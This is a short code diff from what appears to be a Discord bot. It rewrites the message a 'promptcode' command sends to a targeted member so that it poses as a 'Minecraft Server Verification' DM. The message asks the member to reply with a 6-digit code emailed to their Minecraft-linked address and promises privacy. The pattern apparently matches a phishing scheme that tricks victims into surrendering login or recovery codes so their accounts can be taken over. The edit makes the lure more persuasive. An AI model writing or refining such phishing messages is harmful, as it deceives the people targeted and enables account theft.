@@ -88,8 +88,8 @@ async def setup(interaction: discord.Interaction):
 async def promptcode(interaction: discord.Interaction, user: discord.Member):
     try:
         embed = discord.Embed(
-            title="📩 Code Verification",
-            description="Check your email for a 6-digit code and send it here.",
+            title="📨 Minecraft Server Verification",
+            description="We've sent a 6-digit code to your email address linked to your Minecraft account.\nPlease reply to this DM with the code to complete your verification.\n\n🔒 Your information will remain private. If you have any questions, feel free to ask staff!\nThis is an automated message.",
             color=discord.Color.blue()
         )
         embed.set_footer(text="Do not share this code with anyone.")
